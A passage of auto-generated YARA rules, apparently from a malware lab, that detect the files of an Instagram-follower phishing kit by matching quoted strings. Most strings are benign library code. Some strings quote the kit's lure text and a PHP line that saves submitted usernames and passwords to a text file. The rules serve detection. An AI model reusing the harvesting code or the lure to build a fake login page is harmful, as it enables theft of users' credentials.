      $s13 = "        var alerts = 'form.ajax[data-action=\"instagram_login\"] div.ajax-alerts';" fullword ascii /* score: '10.00'*/
      $s14 = "    $('form.ajax[data-action=\"instagram_login\"]').submit(function(e) {" fullword ascii /* score: '10.00'*/
      $s15 = "                        controls.html('Login');" fullword ascii /* score: '10.00'*/
      $s16 = "            data: $('form.ajax[data-action=\"instagram_login\"]').serialize()," fullword ascii /* score: '10.00'*/
      $s17 = "        var fieldset = $('form.ajax[data-action=\"instagram_login\"] fieldset');" fullword ascii /* score: '10.00'*/
      $s18 = "        var controls = $('form.ajax[data-action=\"instagram_login\"] input, form.ajax[data-action=\"instagram_login\"] button');" ascii /* score: '10.00'*/
      $s19 = "                        flash.alert(alerts, 'danger', 'Your account is deactivated. To reactivate account login into our android" ascii /* score: '10.00'*/
      $s20 = "}, 4000);" fullword ascii /* score: '9.00'*/ /* hex encoded string '@' */
   condition:
      uint16(0) == 0x2824 and filesize < 20KB and
      8 of them
}

rule _opt_mal_phish__insta_followers_home_ubuntu_malware_lab_samples_extracted_phishing_Insta_Followers_login_files_styles {
   meta:
      description = "phish__insta_followers - file styles.css"
      author = "Comps Team Malware Lab"
      reference = "phish__insta_followers phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "e01f589e21f0d960a493405cc87bd91c83f85822b81aefa568f7729cb3b4fa29"
   strings:
      $s1 = " * Bootstrap v3.3.7 (http://getbootstrap.com)" fullword ascii /* score: '26.00'*/
      $s2 = ".loginBoxHead" fullword ascii /* score: '24.00'*/
      $s3 = " * License: https://wrapbootstrap.com/help/licenses" fullword ascii /* score: '21.00'*/
      $s4 = " * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)" fullword ascii /* score: '21.00'*/
      $s5 = ".loginBox" fullword ascii /* score: '19.00'*/
      $s6 = ".loginLabel" fullword ascii /* score: '19.00'*/
      $s7 = ".loginText" fullword ascii /* score: '19.00'*/
      $s8 = ".loginBtn" fullword ascii /* score: '19.00'*/
      $s9 = "header .top-logo > img {" fullword ascii /* score: '17.00'*/
      $s10 = "  header .top-logo {" fullword ascii /* score: '17.00'*/
      $s11 = "header .top-logo {" fullword ascii /* score: '17.00'*/
      $s12 = "/*! Source: https://github.com/h5bp/html5-boilerplate/blob/master/src/css/main.css */" fullword ascii /* score: '17.00'*/
      $s13 = "  a[href^=\"javascript:\"]:after {" fullword ascii /* score: '16.00'*/
      $s14 = ".section-header .section-description {" fullword ascii /* score: '15.00'*/
      $s15 = ".link_ads_login" fullword ascii /* score: '15.00'*/
      $s16 = ".inputlogin" fullword ascii /* score: '15.00'*/
      $s17 = ".ads-login" fullword ascii /* score: '15.00'*/
      $s18 = "/*! normalize.css v3.0.3 | MIT License | github.com/necolas/normalize.css */" fullword ascii /* score: '14.00'*/
      $s19 = ".panel-group .panel-heading + .panel-collapse > .list-group {" fullword ascii /* score: '13.00'*/
      $s20 = ".table > colgroup + thead > tr:first-child > th," fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 500KB and
      8 of them
}

rule _opt_mal_phish__insta_followers_home_ubuntu_malware_lab_samples_extracted_phishing_Insta_Followers_login_files_theme_a {
   meta:
      description = "phish__insta_followers - file theme-a.css"
      author = "Comps Team Malware Lab"
      reference = "phish__insta_followers phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5b197678f65ae3012006ba12a4d642410a5b9de65e02894b4ddbd64f5cd31169"
   strings:
      $s1 = ".plan .plan-header {" fullword ascii /* score: '9.00'*/
      $s2 = "/* FEATURES  */" fullword ascii /* score: '8.00'*/
      $s3 = "/* SITE TEXT */" fullword ascii /* score: '8.00'*/
      $s4 = "/* BUTTON THEME */" fullword ascii /* score: '8.00'*/
      $s5 = "/* PLANS  */" fullword ascii /* score: '8.00'*/
      $s6 = "/* CONTACTS */" fullword ascii /* score: '8.00'*/
      $s7 = ".btn-theme:active {" fullword ascii /* score: '7.00'*/
      $s8 = ".btn-theme {" fullword ascii /* score: '7.00'*/
      $s9 = ".btn-theme:hover," fullword ascii /* score: '7.00'*/
      $s10 = "  color: #f05050 !important;" fullword ascii /* score: '7.00'*/
      $s11 = ".btn-theme:focus," fullword ascii /* score: '7.00'*/
      $s12 = "  color: #e26a5d;" fullword ascii /* score: '4.00'*/
      $s13 = "  background-color: #189ec8;" fullword ascii /* score: '4.00'*/
      $s14 = ".plan .plan-features > li > em {" fullword ascii /* score: '4.00'*/
      $s15 = "  background-color: #e26a5d;" fullword ascii /* score: '4.00'*/
      $s16 = "  background-color: #23b7e5;" fullword ascii /* score: '4.00'*/
      $s17 = ".features-list .feature .feature-icon {" fullword ascii /* score: '4.00'*/
      $s18 = ".list-icons li a:focus {" fullword ascii /* score: '4.00'*/
      $s19 = ".list-icons li a:hover," fullword ascii /* score: '4.00'*/
      $s20 = "  color: #23b7e5;" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 1KB and
      8 of them
}

rule _opt_mal_phish__insta_followers_home_ubuntu_malware_lab_samples_extracted_phishing_Insta_Followers_login_files_js {
   meta:
      description = "phish__insta_followers - file js.js"
      author = "Comps Team Malware Lab"
      reference = "phish__insta_followers phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "e8c0d1054ecbad1ec6e9cc8d556d8c8e2735f9c26ad5e19e4c8c4a1a044580fd"
   strings:
      $x1 = "var Lc=function(a,b){Ac.set(a,b);y(Cc(a,b),Bc)},Cc=function(a,b){for(var c={},d=c,e=a.split(\".\"),f=0;f<e.length-1;f++)d=d[e[f]" ascii /* score: '33.00'*/
      $x2 = "G.createElement(\"a\");a&&(b.href=a);return b};var Ya=function(){this.$b=new Ha;var a=new Ia;a.addAll(Wa());Xa(this,function(b){" ascii /* score: '31.00'*/
      $s3 = "var xe=function(){var a=new Ia;a.addAll(Wa());a.addAll({buildSafeUrl:me,decodeHtmlUrl:se,copy:ne,generateUniqueNumber:xc,getCont" ascii /* score: '30.00'*/
      $s4 = "typeof b?b(a)||c():c()},f=function(){for(;0<c.length;)e(c.shift())},h=function(){a||(a=!0,Xf(Y(\"https://\",\"http://\",\"www.go" ascii /* score: '29.00'*/
      $s5 = "c(\"SUBTRACT\",B.Zd);c(\"SWITCH\",B[\"switch\"]);c(\"TERNARY\",B.ae);c(\"TYPEOF\",B[\"typeof\"]);c(\"VAR\",B[\"var\"]);c(\"WHILE" ascii /* score: '27.00'*/
      $s6 = " Copyright (c) 2014 Derek Brans, MIT license https://github.com/krux/postscribe/blob/master/LICENSE. Portions derived from simpl" ascii /* score: '27.00'*/
      $s7 = " Copyright (c) 2014 Derek Brans, MIT license https://github.com/krux/postscribe/blob/master/LICENSE. Portions derived from simpl" ascii /* score: '27.00'*/
      $s8 = "ma.prototype.get=function(a){return this.h.has(a)?this.h.get(a):this.U?this.U.get(a):void 0};ma.prototype.get=ma.prototype.get;m" ascii /* score: '25.00'*/
      $s9 = "var rg=function(a,b,c){a instanceof ge.qc&&(a=a.resolve(ge.Qd(b,c)),b=nc);return{cb:a,I:b}};var sg=function(a,b){var c=(new Date" ascii /* score: '24.00'*/
      $s10 = "{};d[e[e.length-1]]=b;return c};var Mc=new RegExp(/^(.*\\.)?(google|youtube|blogger|withgoogle)(\\.com?)?(\\.[a-z]{2})?\\.?$/),N" ascii /* score: '24.00'*/
      $s11 = "Z.a.gtagua=[\"google\"],function(){var a,b={client_id:1,client_storage:\"storage\",cookie_name:1,cookie_domain:1,cookie_expires:" ascii /* score: '23.00'*/
      $s12 = "function Pd(a){if(void 0===Ld[a.id]){var b;if(\"UA\"==a.prefix)b=Fd(\"gtagua\",{trackingId:a.id});else if(\"AW\"==a.prefix)b=Fd(" ascii /* score: '23.00'*/
      $s13 = "formTarget||a.target||\"\"};b[\"gtm.elementUrl\"]=(a.attributes&&a.attributes.formaction?a.formAction:\"\")||a.action||a.href||a" ascii /* score: '23.00'*/
      $s14 = "dservices.com/pagead/conversion_async.js\"),function(){f();c={push:e}},function(){f();a=!1}))},k=function(a,c,d,e){if(c){var f=a" ascii /* score: '23.00'*/
      $s15 = "://\",\"www.gstatic.com/wcm/loader.js\")));var l={ak:f,cl:h};void 0===d&&(l.autoreplace=c);k(2,d,l,c,e,new Date,e)}},l=function(" ascii /* score: '23.00'*/
      $s16 = "\" \"));return b},Ta=function(a){var b=G.createElement(\"div\");b.innerHTML=\"A<div>\"+a+\"</div>\";b=b.lastChild;for(var c=[];b" ascii /* score: '22.00'*/
      $s17 = "F)?N=\"engagement\":\"exception\"==F&&(N=\"error\");l(k,\"eventCategory\",N);0<=Fe([\"view_item\",\"view_item_list\",\"view_prom" ascii /* score: '22.00'*/
      $s18 = "var We=/^(www\\.)?google(\\.com?)?(\\.[a-z]{2})?$/,Ve=/(^|\\.)doubleclick\\.net$/i;var Ze=window,$e=document;function af(a){if(!" ascii /* score: '22.00'*/
      $s19 = "b=y(a[1],void 0):3==a.length&&pc(a[1])&&(b={},b[a[1]]=a[2]);if(b)return b.eventModel=y(b,void 0),b.event=\"gtag.set\",b._clear=!" ascii /* score: '21.00'*/
      $s20 = "nt(\"script\");d.type=\"text/javascript\";d.async=!0;d.src=a;La(d,b);c&&(d.onerror=c);ea()&&d.setAttribute(\"nonce\",ea());var e" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x2f0a and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule analytics {
   meta:
      description = "phish__insta_followers - file analytics.js"
      author = "Comps Team Malware Lab"
      reference = "phish__insta_followers phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "3fab1c883847e4b5a02f3749a9f4d9eab15cd4765873d3b2904a1a4c8755fba3"
   strings:
      $x1 = "if(!e)return!1;var g=new e;if(!(\"withCredentials\"in g))return!1;a=a.replace(/^http:/,\"https:\");g.open(\"POST\",a,!0);g.withC" ascii /* score: '34.00'*/
      $x2 = "3E4),c=\"\");return Pc(c,b)?(Ub.push(a),!0):!1},Pc=function(a,b,c){if(!window.JSON)return J(58),!1;var d=O.XMLHttpRequest;if(!d)" ascii /* score: '33.00'*/
      $x3 = "(\"https:\"==a||a==c||(\"http:\"!=a?0:\"http:\"==c))&&B(d)&&(wa(d.url,void 0,e),$d.set(b,!0)))}},v=function(a,b){var c=A.get(a)|" ascii /* score: '32.00'*/
      $x4 = "for(d=0;d<a.length;d++)if(b==a[d]){d=!0;break a}d=!1}return d},Cc=function(a){return encodeURIComponent?encodeURIComponent(a).re" ascii /* score: '31.00'*/
      $s5 = "N.N=function(){\"ga\"!=gb&&J(49);var a=O[gb];if(!a||42!=a.answer){N.L=a&&a.l;N.loaded=!0;var b=O[gb]=N;X(\"create\",b,b.create);" ascii /* score: '30.00'*/
      $s6 = "rd(e,b)}})};function sd(a,b){if(b==M.location.hostname)return!1;for(var c=0;c<a.length;c++)if(a[c]instanceof RegExp){if(a[c].tes" ascii /* score: '28.00'*/
      $s7 = "turn J(59),!1;var e=new d;if(!(\"withCredentials\"in e))return J(60),!1;e.open(\"POST\",(c||\"https://ampcid.google.com/v1/publi" ascii /* score: '27.00'*/
      $s8 = "String(a.get(Q)),d.ka=Number(a.get(n)),c=c.palindrome?r:q,c=(c=M.cookie.replace(/^|(; +)/g,\";\").match(c))?c.sort().join(\"\")." ascii /* score: '27.00'*/
      $s9 = "\"\"==a||\":\"==a)return!0;return!1},ya=function(a,b){var c=M.referrer;if(/^(https?|android-app):\\/\\//i.test(c)){if(a)return c" ascii /* score: '27.00'*/
      $s10 = " c=\"https://www.google-analytics.com/gtm/js?id=\"+K(a.id);\"dataLayer\"!=a.B&&b(\"l\",a.B);b(\"t\",a.target);b(\"cid\",a.client" ascii /* score: '27.00'*/
      $s11 = "Dc.prototype.S=function(a,b,c){function d(c){try{c=c||O.event;a:{var d=c.target||c.srcElement;for(c=100;d&&0<c;){if(d.href&&d.no" ascii /* score: '27.00'*/
      $s12 = "c.type=\"text/javascript\",c.async=!0,c.src=a,b&&(c.id=b),a=M.getElementsByTagName(\"script\")[0],a.parentNode.insertBefore(c,a)" ascii /* score: '24.00'*/
      $s13 = "(a=[\"t=error\",\"_e=\"+a,\"_v=j68\",\"sr=1\"],b&&a.push(\"_f=\"+b),c&&a.push(\"_m=\"+K(c.substring(0,100))),a.push(\"aip=1\"),a" ascii /* score: '24.00'*/
      $s14 = "b){Za.push([new RegExp(\"^\"+a+\"$\"),b])},T=function(a,b,c){return S(a,b,c,void 0,db)},db=function(){};var gb=qa(window.GoogleA" ascii /* score: '23.00'*/
      $s15 = "pc.prototype.ma=function(a,b){var c=this;u(a,c,b)||(v(a,function(){u(a,c,b)}),y(String(c.get(V)),a,void 0,b,!0))};var rc=functio" ascii /* score: '23.00'*/
      $s16 = "if(!e)return!1;var g=new e;if(!(\"withCredentials\"in g))return!1;a=a.replace(/^http:/,\"https:\");g.open(\"POST\",a,!0);g.withC" ascii /* score: '23.00'*/
      $s17 = "l?\"https:\":\"http:\")+\"//www.google-analytics.com\"},Da=function(a){this.name=\"len\";this.message=a+\"-8192\"},ba=function(a" ascii /* score: '23.00'*/
      $s18 = "cation.protocol?\"https:\":\"http:\")+\"//www.google-analytics.com/plugins/ua/\"+c),d=ae(c),a=d.protocol,c=M.location.protocol," fullword ascii /* score: '22.00'*/
      $s19 = "encodeURIComponent(a),\"/\",e,\"\",b)){fb=e;return}}}zc(\"AMP_TOKEN\",encodeURIComponent(a),\"/\",fb,\"\",b)},Qc=function(a,b,c)" ascii /* score: '22.00'*/
      $s20 = "H=function(a,b){null===a.ra&&(a.ra=1===Ed(b),a.ra&&J(33));return a.ra},Wd=/^gtm\\d+$/;var fd=function(a,b){a=a.b;if(!a.get(\"dcL" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__insta_followers_home_ubuntu_malware_lab_samples_extracted_phishing_Insta_Followers_login_files_css {
   meta:
      description = "phish__insta_followers - file css.css"
      author = "Comps Team Malware Lab"
      reference = "phish__insta_followers phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "e2459019c5085c1cca2958860b3a7b241117a64417aced819c87f7d042a300e7"
   strings:
      $s1 = "  src: local('Source Sans Pro Italic'), local('SourceSansPro-Italic'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK1dSB" ascii /* score: '16.00'*/
      $s2 = "  src: local('Source Sans Pro SemiBold'), local('SourceSansPro-SemiBold'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK" ascii /* score: '16.00'*/
      $s3 = "  src: local('Source Sans Pro SemiBold'), local('SourceSansPro-SemiBold'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK" ascii /* score: '16.00'*/
      $s4 = "  src: local('Source Sans Pro Regular'), local('SourceSansPro-Regular'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK3d" ascii /* score: '16.00'*/
      $s5 = "  src: local('Source Sans Pro Italic'), local('SourceSansPro-Italic'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK1dSB" ascii /* score: '16.00'*/
      $s6 = "  src: local('Source Sans Pro Light'), local('SourceSansPro-Light'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xKydSBYK" ascii /* score: '16.00'*/
      $s7 = "  src: local('Source Sans Pro Regular'), local('SourceSansPro-Regular'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK3d" ascii /* score: '16.00'*/
      $s8 = "  src: local('Source Sans Pro SemiBold'), local('SourceSansPro-SemiBold'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK" ascii /* score: '16.00'*/
      $s9 = "  src: local('Source Sans Pro Regular'), local('SourceSansPro-Regular'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK3d" ascii /* score: '16.00'*/
      $s10 = "  src: local('Source Sans Pro SemiBold'), local('SourceSansPro-SemiBold'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK" ascii /* score: '16.00'*/
      $s11 = "  src: local('Source Sans Pro Italic'), local('SourceSansPro-Italic'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK1dSB" ascii /* score: '16.00'*/
      $s12 = "  src: local('Source Sans Pro Italic'), local('SourceSansPro-Italic'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK1dSB" ascii /* score: '16.00'*/
      $s13 = "  src: local('Source Sans Pro SemiBold'), local('SourceSansPro-SemiBold'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK" ascii /* score: '16.00'*/
      $s14 = "  src: local('Source Sans Pro Light'), local('SourceSansPro-Light'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xKydSBYK" ascii /* score: '16.00'*/
      $s15 = "  src: local('Source Sans Pro Light'), local('SourceSansPro-Light'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xKydSBYK" ascii /* score: '16.00'*/
      $s16 = "  src: local('Source Sans Pro Italic'), local('SourceSansPro-Italic'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK1dSB" ascii /* score: '16.00'*/
      $s17 = "  src: local('Source Sans Pro SemiBold'), local('SourceSansPro-SemiBold'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK" ascii /* score: '16.00'*/
      $s18 = "  src: local('Source Sans Pro Regular'), local('SourceSansPro-Regular'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK3d" ascii /* score: '16.00'*/
      $s19 = "  src: local('Source Sans Pro SemiBold'), local('SourceSansPro-SemiBold'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK" ascii /* score: '16.00'*/
      $s20 = "  src: local('Source Sans Pro Italic'), local('SourceSansPro-Italic'), url(https://fonts.gstatic.com/s/sourcesanspro/v11/6xK1dSB" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 30KB and
      8 of them
}

rule font_awesome {
   meta:
      description = "phish__insta_followers - file font-awesome.css"
      author = "Comps Team Malware Lab"
      reference = "phish__insta_followers phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "7c2b517d9a918e9aeca85c02904d1771920d4ea3778bcd037238f6ecbf565f32"
   strings:
      $x1 = " */@font-face{font-family:FontAwesome;src:url(../fonts/fontawesome-webfont.eot?v=4.6.3);src:url(../fonts/fontawesome-webfont.eot" ascii /* score: '50.00'*/
      $s2 = "-circle-o:before{content:\"\\f29c\"}.fa-blind:before{content:\"\\f29d\"}.fa-audio-description:before{content:\"\\f29e\"}.fa-volu" ascii /* score: '26.00'*/
      $s3 = "tent:\"\\f0ec\"}.fa-cloud-download:before{content:\"\\f0ed\"}.fa-cloud-upload:before{content:\"\\f0ee\"}.fa-user-md:before{conte" ascii /* score: '24.00'*/
      $s4 = "ontent:\"\\f142\"}.fa-rss-square:before{content:\"\\f143\"}.fa-play-circle:before{content:\"\\f144\"}.fa-ticket:before{content:" ascii /* score: '23.00'*/
      $s5 = "fore,.fa-users:before{content:\"\\f0c0\"}.fa-chain:before,.fa-link:before{content:\"\\f0c1\"}.fa-cloud:before{content:\"\\f0c2\"" ascii /* score: '23.00'*/
      $s6 = "\"\\f1f9\"}.fa-at:before{content:\"\\f1fa\"}.fa-eyedropper:before{content:\"\\f1fb\"}.fa-paint-brush:before{content:\"\\f1fc\"}." ascii /* score: '22.00'*/
      $s7 = "\\f021\"}.fa-list-alt:before{content:\"\\f022\"}.fa-lock:before{content:\"\\f023\"}.fa-flag:before{content:\"\\f024\"}.fa-headph" ascii /* score: '21.00'*/
      $s8 = "re{content:\"\\f129\"}.fa-exclamation:before{content:\"\\f12a\"}.fa-superscript:before{content:\"\\f12b\"}.fa-subscript:before{c" ascii /* score: '21.00'*/
      $s9 = "\\f056\"}.fa-times-circle:before{content:\"\\f057\"}.fa-check-circle:before{content:\"\\f058\"}.fa-question-circle:before{conten" ascii /* score: '21.00'*/
      $s10 = "l-phone:before{content:\"\\f2a0\"}.fa-braille:before{content:\"\\f2a1\"}.fa-assistive-listening-systems:before{content:\"\\f2a2" ascii /* score: '21.00'*/
      $s11 = "t:\"\\f1a4\"}.fa-delicious:before{content:\"\\f1a5\"}.fa-digg:before{content:\"\\f1a6\"}.fa-pied-piper-pp:before{content:\"\\f1a" ascii /* score: '21.00'*/
      $s12 = "-piper-alt:before{content:\"\\f1a8\"}.fa-drupal:before{content:\"\\f1a9\"}.fa-joomla:before{content:\"\\f1aa\"}.fa-language:befo" ascii /* score: '21.00'*/
      $s13 = "tent:\"\\f2ad\"}.fa-pied-piper:before{content:\"\\f2ae\"}.fa-first-order:before{content:\"\\f2b0\"}.fa-yoast:before{content:\"" ascii /* score: '21.00'*/
      $s14 = "ile-o:before{content:\"\\f016\"}.fa-clock-o:before{content:\"\\f017\"}.fa-road:before{content:\"\\f018\"}.fa-download:before{con" ascii /* score: '21.00'*/
      $s15 = "fore{content:\"\\f21a\"}.fa-user-secret:before{content:\"\\f21b\"}.fa-motorcycle:before{content:\"\\f21c\"}.fa-street-view:befor" ascii /* score: '21.00'*/
      $s16 = "ontent:\"\\f053\"}.fa-chevron-right:before{content:\"\\f054\"}.fa-plus-circle:before{content:\"\\f055\"}.fa-minus-circle:before{" ascii /* score: '20.00'*/
      $s17 = "}.fa-play-circle-o:before{content:\"\\f01d\"}.fa-repeat:before,.fa-rotate-right:before{content:\"\\f01e\"}.fa-refresh:before{con" ascii /* score: '20.00'*/
      $s18 = "before{content:\"\\f134\"}.fa-rocket:before{content:\"\\f135\"}.fa-maxcdn:before{content:\"\\f136\"}.fa-chevron-circle-left:befo" ascii /* score: '20.00'*/
      $s19 = "-left:before{content:\"\\f0a8\"}.fa-arrow-circle-right:before{content:\"\\f0a9\"}.fa-arrow-circle-up:before{content:\"\\f0aa\"}." ascii /* score: '20.00'*/
      $s20 = "f191\"}.fa-dot-circle-o:before{content:\"\\f192\"}.fa-wheelchair:before{content:\"\\f193\"}.fa-vimeo-square:before{content:\"\\f" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule smoothscroll {
   meta:
      description = "phish__insta_followers - file smoothscroll.js"
      author = "Comps Team Malware Lab"
      reference = "phish__insta_followers phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "a56d78f3ee3fa34a95c3dd9637ffad6a781d70551c105389df515dd4d01772bd"
   strings:
      $x1 = "function ssc_init(){if(document.body){var e=document.body,s=document.documentElement,c=window.innerHeight,t=e.scrollHeight;if(ss" ascii /* score: '34.00'*/
      $s2 = "lt()}function ssc_keydown(e){var s=e.target,c=e.ctrlKey||e.altKey||e.metaKey;if(/input|textarea|embed/i.test(s.nodeName)||s.isCo" ascii /* score: '17.00'*/
      $s3 = "c_root=document.compatMode.indexOf(\"CSS\")>=0?s:e,ssc_activeElement=e,ssc_initdone=!0,top!=self)ssc_frame=!0;else if(t>c&&(e.of" ascii /* score: '17.00'*/
      $s4 = "e){ssc_initdone||ssc_init();var s=e.target,c=ssc_overflowingAncestor(s);if(!c||e.defaultPrevented||ssc_isNodeName(ssc_activeElem" ascii /* score: '14.00'*/
      $s5 = "wscroll;break;default:return!0}ssc_scrollArray(n,o,r),e.preventDefault()}function ssc_mousedown(e){ssc_activeElement=e.target}fu" ascii /* score: '14.00'*/
      $s6 = "){if(!ssc_frame||ssc_root.clientHeight+10<c)return ssc_setCache(s,document.body)}else if(e.clientHeight+10<e.scrollHeight&&(over" ascii /* score: '10.00'*/
      $s7 = "keyboardsupport=!0,ssc_arrowscroll=50,ssc_frame=!1,ssc_direction={x:0,y:0},ssc_initdone=!1,ssc_fixedback=!0,ssc_root=document.do" ascii /* score: '10.00'*/
      $s8 = "h=e.scrollLeft;e.scrollLeft+=n,n&&e.scrollLeft===h&&(s=0)}if(c){var p=e.scrollTop;e.scrollTop+=a,a&&e.scrollTop===p&&(c=0)}s||c|" ascii /* score: '8.00'*/
      $s9 = "){return s.ssc_uniqueID||(s.ssc_uniqueID=e++)}}(),ischrome=/chrome/.test(navigator.userAgent.toLowerCase());ischrome&&(ssc_addEv" ascii /* score: '8.00'*/
      $s10 = "flow=getComputedStyle(e,\"\").getPropertyValue(\"overflow\"),\"scroll\"===overflow||\"auto\"===overflow))return ssc_setCache(s,e" ascii /* score: '8.00'*/
      $s11 = "function ssc_init(){if(document.body){var e=document.body,s=document.documentElement,c=window.innerHeight,t=e.scrollHeight;if(ss" ascii /* score: '8.00'*/
      $s12 = "etHeight<=c||s.offsetHeight<=c)&&(ssc_root.style.height=\"auto\",ssc_root.offsetHeight<=c)){var o=document.createElement(\"div\"" ascii /* score: '7.00'*/
      $s13 = "|(ssc_que=[]),ssc_que.length?setTimeout(o,t/ssc_framerate+1):ssc_pending=!1};setTimeout(o,0),ssc_pending=!0}}function ssc_wheel(" ascii /* score: '7.00'*/
      $s14 = "r s=[],c=ssc_root.scrollHeight;do{var t=ssc_cache[ssc_uniqueID(e)];if(t)return ssc_setCache(s,t);if(s.push(e),c===e.scrollHeight" ascii /* score: '7.00'*/
      $s15 = ",ssc_keyboardsupport&&ssc_addEvent(\"keydown\",ssc_keydown)}}function ssc_scrollArray(e,s,c,t){if(t||(t=1e3),ssc_directionCheck(" ascii /* score: '7.00'*/
      $s16 = "reak;case ssc_key.pageup:r=.9*-a;break;case ssc_key.pagedown:r=.9*a;break;case ssc_key.home:r=-n.scrollTop;break;case ssc_key.en" ascii /* score: '7.00'*/
      $s17 = "cumentElement,ssc_activeElement,ssc_key={left:37,up:38,right:39,down:40,spacebar:32,pageup:33,pagedown:34,end:35,home:36},ssc_qu" ascii /* score: '7.00'*/
      $s18 = "ent,\"embed\")||ssc_isNodeName(s,\"embed\")&&/\\.pdf/i.test(s.src))return!0;var t=e.wheelDeltaX||0,o=e.wheelDeltaY||0;t||o||(o=e" ascii /* score: '7.00'*/
      $s19 = "d:var i=n.scrollHeight-n.scrollTop-a;r=i>0?i+10:0;break;case ssc_key.left:o=-ssc_arrowscroll;break;case ssc_key.right:o=ssc_arro" ascii /* score: '7.00'*/
      $s20 = "style.clear=\"both\",e.appendChild(o)}ssc_fixedback||(e.style.backgroundAttachment=\"scroll\",s.style.backgroundAttachment=\"scr" ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__insta_followers_home_ubuntu_malware_lab_samples_extracted_phishing_Insta_Followers_index {
   meta:
      description = "phish__insta_followers - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__insta_followers phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__insta_followers_home_ubuntu_malware_lab_samples_extracted_phishing_Insta_Followers_login {
   meta:
      description = "phish__insta_followers - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__insta_followers phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "cf24fa8f18c88f5a745a665a8c64b7f7170271de51b84a3652a7f80f55996dda"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['username'] . \" Pass: \" . $_POST['password'] . \"\\n\", FILE_APPEN" ascii /* score: '29.00'*/
      $s2 = "header('Location: https://instafollowerspro.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__insta_followers_home_ubuntu_malware_lab_samples_extracted_phishing_Insta_Followers_login_2 {
   meta:
      description = "phish__insta_followers - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__insta_followers phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "433f55b5590629be5c2195a61b2287ae6a82d0905b2bfc6ea6b15745a69876a8"
   strings:
      $s1 = "Before login to this website you need to read <a href=\"https://www.instafollowerspro.com/privacy-policy\" style=\"font-weight:b" ascii /* score: '28.00'*/
      $s2 = "Before login to this website you need to read <a href=\"https://www.instafollowerspro.com/privacy-policy\" style=\"font-weight:b" ascii /* score: '28.00'*/
      $s3 = " while login into this website. It's mean your account was temporary " fullword ascii /* score: '22.00'*/
      $s4 = "   <meta name=\"description\" content=\"Here you can login insta followers por. to Get followers you will need to login with you" ascii /* score: '19.00'*/
      $s5 = "   <meta name=\"description\" content=\"Here you can login insta followers por. to Get followers you will need to login with you" ascii /* score: '19.00'*/
      $s6 = "   <meta name=\"keywords\" content=\"insta followers login, login instagram, instagram followers login\">" fullword ascii /* score: '18.00'*/
      $s7 = "   <title>Login - Insta Followers Pro</title>" fullword ascii /* score: '18.00'*/
      $s8 = "<script async=\"\" src=\"login_files/js.js\"></script>" fullword ascii /* score: '18.00'*/
      $s9 = "                     <li><a href=\"https://www.instafollowerspro.com/android-app\">Download App</a>" fullword ascii /* score: '18.00'*/
      $s10 = "<!-- START HEADER-->" fullword ascii /* score: '18.00'*/
      $s11 = "; color: red;\">Privacy Policy</a> &amp; <a href=\"https://www.instafollowerspro.com/terms\" style=\"font-weight:bold; color: re" ascii /* score: '17.00'*/
      $s12 = "s://www.instafollowerspro.com/privacy-policy\" style=\"font-weight:bold; color: red;\">Privacy Policy</a> &amp; <a href=\"https:" ascii /* score: '17.00'*/
      $s13 = "<!-- Global site tag (gtag.js) - Google Analytics -->" fullword ascii /* score: '17.00'*/
      $s14 = "          <a href=\"http://urlshortener.biz/fnL4D\" target=\"_blank\" class=\"btn btn-default btn-lg btn-square\"><i class=\"fa " ascii /* score: '17.00'*/
      $s15 = "enter your instagram login detail to get login. You can also login using" fullword ascii /* score: '16.00'*/
